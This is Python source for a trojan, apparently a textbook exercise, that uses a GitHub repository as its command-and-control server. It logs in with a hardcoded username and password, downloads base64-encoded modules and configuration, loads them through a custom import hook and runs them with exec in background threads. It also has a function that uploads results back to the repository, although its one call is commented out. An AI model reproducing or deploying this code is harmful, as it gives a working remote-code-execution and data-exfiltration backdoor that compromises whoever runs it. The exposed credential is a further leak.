import json
import base64
import sys
import time
import random
import threading
import queue
import os
import inspect
from importlib import machinery
from importlib.abc import InspectLoader
import os
import types


from github3 import login

trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path	 = "data/%s/" % trojan_id
trojan_modules= []

task_queue	= queue.Queue()
configured	= False

class GitImporter(object):

	def __init__(self):

		self.current_module_code = ""
		
	def find_module(self,fullname,path=None):
		if configured:
			print("[*] Attempting to retrieve %s" % fullname)
			new_library = get_file_contents("modules/%s" % fullname)

			if new_library is not None:
				self.current_module_code = base64.b64decode(new_library)
				return self

		return None

	def load_module(self,name):

		#tempfilename = name + "temp.py"
		print(name)
		#print(self.current_module_code)
		#f = open(tempfilename,'w')
		#f.write( self.current_module_code.decode('utf-8'))
		#f.close()
		
		#loader = machinery.SourceFileLoader(name, tempfilename)
		#module = loader.load_module()
		
		module = types.ModuleType(name)
		code = InspectLoader.source_to_code(self.current_module_code.decode('utf-8'))
		
		exec(code,module.__dict__)
		
		sys.modules[name] = module
		
		#os.remove(tempfilename)

		return module
				
def connect_to_github():
	gh = login('toshihiko-kobayashi', password='tk47119599')
	repo = gh.repository("toshihiko-kobayashi","chapter7")
	branch = repo.branch("master")

	return gh,repo,branch

def get_file_contents(filepath):

	gh,repo,branch = connect_to_github()

	tree = branch.commit.commit.tree.to_tree().recurse()

	for filename in tree.tree:

		if filepath in filename.path:
			print("[*] Found file %s" % filepath)

			blob = repo.blob(filename._json_data['sha'])
			
			return blob.content

	return None

def get_trojan_config():
	global configured

	config_json   = get_file_contents(trojan_config)
	config		= json.loads(base64.b64decode(config_json))
	configured	= True

	for task in config:
	
		if task['module'] not in sys.modules:
		
			string = "import %s" % task['module']
		
			exec(string)
			
	return config

def store_module_result(data):

	gh,repo,branch = connect_to_github()

	remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))

	repo.create_file(remote_path,"Commit message",data.encode('utf-8'))

	return

def module_runner(module):
	
	task_queue.put(1)
	
	print(sys.modules[module])
	#result = exec(sys.modules[module].run())
	result = sys.modules[module].run()
	task_queue.get()

	# リポジトリに結果を保存する
	#store_module_result(result)
	
	#print(result)

	return


# トロイの木馬のメインループ

print("start")

sys.meta_path.append(GitImporter())

print("metapath set")

if task_queue.empty():

		print("config read")

		config = get_trojan_config()
		
		print(config)
		
		print("config read end")

		for task in config:
			t = threading.Thread(target=module_runner,args=(task['module'],))
			t.start()
			time.sleep(random.randint(1,3))
